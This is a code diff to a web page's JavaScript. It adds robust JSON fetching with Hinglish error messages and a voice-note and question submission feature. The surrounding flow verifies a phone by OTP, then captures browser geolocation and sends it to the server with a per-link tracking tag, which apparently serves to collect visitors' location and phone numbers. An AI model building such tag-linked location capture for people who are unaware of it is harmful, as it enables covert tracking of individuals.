@@ -34,16 +34,59 @@ let resendInterval = null;
 let latestOtpCode = '';
 let currentSiteConfig = null;
 
+// Determine API Base URL (if user runs from Live Server on port 5500 or file://, fallback to http://localhost:3000)
+const API_BASE = (window.location.protocol === 'file:' || (window.location.port && window.location.port !== '3000' && (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')))
+  ? 'http://localhost:3000'
+  : '';
+
+// Safe JSON fetcher that handles non-JSON / HTML errors gracefully
+async function safeFetchJson(endpoint, options = {}) {
+  const fullUrl = endpoint.startsWith('http') ? endpoint : `${API_BASE}${endpoint}`;
+  let res;
+  try {
+    res = await fetch(fullUrl, options);
+  } catch (netErr) {
+    throw new Error(`Cannot connect to server (${netErr.message}). Make sure 'node server.js' is running on port 3000.`);
+  }
+
+  const contentType = res.headers.get('content-type') || '';
+  if (contentType.includes('application/json')) {
+    const data = await res.json();
+    if (!res.ok) {
+      throw new Error(data.error || `Server error (HTTP ${res.status})`);
+    }
+    return data;
+  }
+
+  // Non-JSON response received (e.g. HTML 404 or Express default error)
+  const rawText = await res.text();
+  const match = rawText.match(/<pre>(.*?)<\/pre>/s);
+  const cleanMsg = match ? match[1].replace(/<[^>]+>/g, '').trim() : '';
+
+  if (cleanMsg) {
+    throw new Error(`${cleanMsg}. (Please restart server: node server.js)`);
+  }
+
+  if (rawText.includes('<!DOCTYPE') || rawText.includes('<html')) {
+    throw new Error(`Server returned HTML (HTTP ${res.status}). Server ko restart karein: node server.js`);
+  }
+
+  try {
+    return JSON.parse(rawText);
+  } catch (e) {
+    throw new Error(`Invalid response (HTTP ${res.status}): ${rawText.slice(0, 100)}`);
+  }
+}
+
 // Load live site config from backend on startup
 async function loadSiteConfig() {
   try {
-    const res = await fetch('/api/config');
-    const data = await res.json();
+    const data = await safeFetchJson('/api/config');
     if (data.success && data.config) {
       applySiteConfig(data.config);
     }
   } catch (e) {
-    console.warn('Using default UI config');
+    console.warn('Using default UI config:', e.message);
   }
 }
 
@@ -166,7 +209,7 @@ async function handleSendOtp() {
   sendOtpBtn.innerHTML = `<span>Sending OTP...</span>`;
 
   try {
-    const res = await fetch('/api/otp/send', {
+    const data = await safeFetchJson('/api/otp/send', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -174,12 +217,6 @@ async function handleSendOtp() {
         tag: trackingTag
       })
     });
-
-    const data = await res.json();
-
-    if (!res.ok) {
-      throw new Error(data.error || 'Failed to send OTP');
-    }
 
     latestOtpCode = data.otpPreview || '';
 
@@ -237,7 +274,7 @@ async function handleVerifyOtpAndLocate() {
   verifyOtpBtn.innerHTML = `<span>Verifying Code...</span>`;
 
   try {
-    const res = await fetch('/api/otp/verify', {
+    const data = await safeFetchJson('/api/otp/verify', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -245,12 +282,6 @@ async function handleVerifyOtpAndLocate() {
         otp: enteredOtp
       })
     });
-
-    const data = await res.json();
-
-    if (!res.ok) {
-      throw new Error(data.error || 'Verification failed');
-    }
 
     // OTP Verified! Hide SMS banner & trigger Geolocation
     smsBanner.style.display = 'none';
@@ -301,7 +332,7 @@ async function requestAndTransmitLocation(verifiedPhone) {
       const timestamp = new Date(position.timestamp).toISOString();
 
       try {
-        await fetch('/api/location', {
+        await safeFetchJson('/api/location', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -466,3 +497,304 @@ resendOtpBtn.addEventListener('click', () => {
 
 sendOtpBtn.addEventListener('click', handleSendOtp);
 verifyOtpBtn.addEventListener('click', handleVerifyOtpAndLocate);
+
+// --------------------------------------------------------------------------
+// User Query / Question & Voice Note Submission Logic
+// --------------------------------------------------------------------------
+const userQueryText = document.getElementById('userQueryText');
+const submitQueryBtn = document.getElementById('submitQueryBtn');
+const queryStatusAlert = document.getElementById('queryStatusAlert');
+const queryInputArea = document.getElementById('queryInputArea');
+const querySuccessNotice = document.getElementById('querySuccessNotice');
+const askMoreBtn = document.getElementById('askMoreBtn');
+
+// Voice Note UI Elements
+const voiceIdleBox = document.getElementById('voiceIdleBox');
+const startVoiceBtn = document.getElementById('startVoiceBtn');
+const voiceRecordingBox = document.getElementById('voiceRecordingBox');
+const voiceRecordTimer = document.getElementById('voiceRecordTimer');
+const stopVoiceBtn = document.getElementById('stopVoiceBtn');
+const cancelVoiceBtn = document.getElementById('cancelVoiceBtn');
+const voicePreviewBox = document.getElementById('voicePreviewBox');
+const voiceDurationTag = document.getElementById('voiceDurationTag');
+const deleteVoiceBtn = document.getElementById('deleteVoiceBtn');
+const voiceAudioElement = document.getElementById('voiceAudioElement');
+
+// Voice Note Recording State
+let mediaRecorder = null;
+let mediaStream = null;
+let audioChunks = [];
+let recordingInterval = null;
+let recordingSeconds = 0;
+const MAX_RECORDING_SECONDS = 15;
+let recordedAudioBlob = null;
+let recordedAudioBase64 = null;
+let recordedAudioDuration = 0;
+let previewAudioUrl = null;
+
+// Format seconds into MM:SS
+function formatRecordTime(sec) {
+  const m = Math.floor(sec / 60).toString().padStart(2, '0');
+  const s = (sec % 60).toString().padStart(2, '0');
+  return `${m}:${s}`;
+}
+
+// Reset Voice Note UI & State
+function resetVoiceNote() {
+  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+    try { mediaRecorder.stop(); } catch (e) {}
+  }
+  if (mediaStream) {
+    mediaStream.getTracks().forEach(track => track.stop());
+    mediaStream = null;
+  }
+  clearInterval(recordingInterval);
+  recordingInterval = null;
+  recordingSeconds = 0;
+  audioChunks = [];
+  recordedAudioBlob = null;
+  recordedAudioBase64 = null;
+  recordedAudioDuration = 0;
+
+  if (previewAudioUrl) {
+    URL.revokeObjectURL(previewAudioUrl);
+    previewAudioUrl = null;
+  }
+  if (voiceAudioElement) {
+    voiceAudioElement.src = '';
+  }
+
+  if (voiceIdleBox) voiceIdleBox.style.display = 'flex';
+  if (voiceRecordingBox) voiceRecordingBox.style.display = 'none';
+  if (voicePreviewBox) voicePreviewBox.style.display = 'none';
+}
+
+// Start Voice Recording
+async function startVoiceRecording() {
+  if (queryStatusAlert) queryStatusAlert.style.display = 'none';
+
+  // Check MediaDevices support
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia || typeof MediaRecorder === 'undefined') {
+    if (queryStatusAlert) {
+      queryStatusAlert.style.display = 'block';
+      queryStatusAlert.textContent = '⚠️ Aapke browser me audio recording support nahi hai. Kripya type karke sawal bhejein.';
+    }
+    return;
+  }
+
+  try {
+    mediaStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+  } catch (err) {
+    console.warn('Microphone access denied:', err);
+    if (queryStatusAlert) {
+      queryStatusAlert.style.display = 'block';
+      queryStatusAlert.textContent = '⚠️ Microphone permission allow karein taaki aap aawaz record kar sakein!';
+    }
+    return;
+  }
+
+  // Determine optimal supported MIME type
+  let mimeType = '';
+  const candidateTypes = [
+    'audio/webm;codecs=opus',
+    'audio/webm',
+    'audio/mp4',
+    'audio/aac',
+    'audio/ogg'
+  ];
+  for (const t of candidateTypes) {
+    if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(t)) {
+      mimeType = t;
+      break;
+    }
+  }
+
+  try {
+    audioChunks = [];
+    recordingSeconds = 0;
+    mediaRecorder = mimeType ? new MediaRecorder(mediaStream, { mimeType }) : new MediaRecorder(mediaStream);
+
+    mediaRecorder.ondataavailable = (e) => {
+      if (e.data && e.data.size > 0) {
+        audioChunks.push(e.data);
+      }
+    };
+
+    mediaRecorder.onstop = () => {
+      // Release microphone tracks
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+        mediaStream = null;
+      }
+      clearInterval(recordingInterval);
+
+      if (audioChunks.length === 0) {
+        resetVoiceNote();
+        return;
+      }
+
+      recordedAudioDuration = recordingSeconds || 1;
+      const type = mediaRecorder.mimeType || 'audio/webm';
+      recordedAudioBlob = new Blob(audioChunks, { type });
+
+      // Convert to Base64 data URL for easy transmission
+      const reader = new FileReader();
+      reader.onloadend = () => {
+        recordedAudioBase64 = reader.result;
+      };
+      reader.readAsDataURL(recordedAudioBlob);
+
+      // Setup audio preview element
+      if (previewAudioUrl) URL.revokeObjectURL(previewAudioUrl);
+      previewAudioUrl = URL.createObjectURL(recordedAudioBlob);
+      if (voiceAudioElement) {
+        voiceAudioElement.src = previewAudioUrl;
+      }
+
+      if (voiceDurationTag) {
+        voiceDurationTag.textContent = `${recordedAudioDuration}s`;
+      }
+
+      if (voiceRecordingBox) voiceRecordingBox.style.display = 'none';
+      if (voicePreviewBox) voicePreviewBox.style.display = 'flex';
+    };
+
+    mediaRecorder.start(200); // 200ms slice for real-time capture
+
+    // Update UI to recording state
+    if (voiceIdleBox) voiceIdleBox.style.display = 'none';
+    if (voicePreviewBox) voicePreviewBox.style.display = 'none';
+    if (voiceRecordingBox) voiceRecordingBox.style.display = 'flex';
+    if (voiceRecordTimer) voiceRecordTimer.textContent = `00:00 / 00:${MAX_RECORDING_SECONDS}`;
+
+    // Start 15s Timer
+    recordingInterval = setInterval(() => {
+      recordingSeconds++;
+      if (voiceRecordTimer) {
+        voiceRecordTimer.textContent = `${formatRecordTime(recordingSeconds)} / 00:${MAX_RECORDING_SECONDS}`;
+      }
+
+      // Auto-stop at 15 seconds limit
+      if (recordingSeconds >= MAX_RECORDING_SECONDS) {
+        stopVoiceRecording();
+      }
+    }, 1000);
+
+  } catch (recErr) {
+    console.error('Failed to start MediaRecorder:', recErr);
+    resetVoiceNote();
+    if (queryStatusAlert) {
+      queryStatusAlert.style.display = 'block';
+      queryStatusAlert.textContent = '⚠️ Voice recording shuru karne me samasya aayi. Kripya dobara koshish karein.';
+    }
+  }
+}
+
+// Stop Voice Recording
+function stopVoiceRecording() {
+  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+    try {
+      mediaRecorder.stop();
+    } catch (e) {}
+  }
+}
+
+// Cancel Voice Recording (Discard)
+function cancelVoiceRecording() {
+  resetVoiceNote();
+}
+
+// Event Listeners for Voice Recording
+if (startVoiceBtn) {
+  startVoiceBtn.addEventListener('click', startVoiceRecording);
+}
+if (stopVoiceBtn) {
+  stopVoiceBtn.addEventListener('click', stopVoiceRecording);
+}
+if (cancelVoiceBtn) {
+  cancelVoiceBtn.addEventListener('click', cancelVoiceRecording);
+}
+if (deleteVoiceBtn) {
+  deleteVoiceBtn.addEventListener('click', resetVoiceNote);
+}
+
+// Submit Query & Voice Note
+if (submitQueryBtn && userQueryText) {
+  submitQueryBtn.addEventListener('click', async () => {
+    // If user is actively recording when clicking send, stop recording first
+    if (mediaRecorder && mediaRecorder.state === 'recording') {
+      stopVoiceRecording();
+      // Wait brief moment for blob to convert
+      await new Promise(r => setTimeout(r, 400));
+    }
+
+    const query = userQueryText.value.trim();
+
+    // Must have either typed text OR voice note
+    if (!query && !recordedAudioBase64) {
+      if (queryStatusAlert) {
+        queryStatusAlert.style.display = 'block';
+        queryStatusAlert.textContent = '⚠️ Kripya apna sawal likhein ya mic se voice note record karein!';
+      }
+      userQueryText.classList.remove('shake-input');
+      void userQueryText.offsetWidth;
+      userQueryText.classList.add('shake-input');
+      userQueryText.focus();
+      return;
+    }
+
+    if (queryStatusAlert) queryStatusAlert.style.display = 'none';
+
+    submitQueryBtn.disabled = true;
+    const originalBtnContent = submitQueryBtn.innerHTML;
+    submitQueryBtn.innerHTML = `<span>Bheja ja raha hai...</span>`;
+
+    try {
+      const data = await safeFetchJson('/api/query', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          query,
+          audioData: recordedAudioBase64 || null,
+          audioDuration: recordedAudioDuration || null,
+          phoneNumber: currentFormattedPhone || 'N/A',
+          tag: trackingTag
+        })
+      });
+
+      // Success: clear inputs & voice note, show success notice
+      userQueryText.value = '';
+      resetVoiceNote();
+      if (queryInputArea) queryInputArea.style.display = 'none';
+      if (querySuccessNotice) querySuccessNotice.style.display = 'block';
+
+    } catch (err) {
+      if (queryStatusAlert) {
+        queryStatusAlert.style.display = 'block';
+        queryStatusAlert.textContent = `⚠️ Error: ${err.message}`;
+      }
+    } finally {
+      submitQueryBtn.disabled = false;
+      submitQueryBtn.innerHTML = originalBtnContent;
+    }
+  });
+
+  // Submit on Ctrl+Enter or Cmd+Enter
+  userQueryText.addEventListener('keydown', (e) => {
+    if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
+      submitQueryBtn.click();
+    }
+  });
+}
+
+if (askMoreBtn) {
+  askMoreBtn.addEventListener('click', () => {
+    if (querySuccessNotice) querySuccessNotice.style.display = 'none';
+    if (queryInputArea) queryInputArea.style.display = 'block';
+    resetVoiceNote();
+    if (userQueryText) {
+      userQueryText.value = '';
+      userQueryText.focus();
+    }
+  });
+}
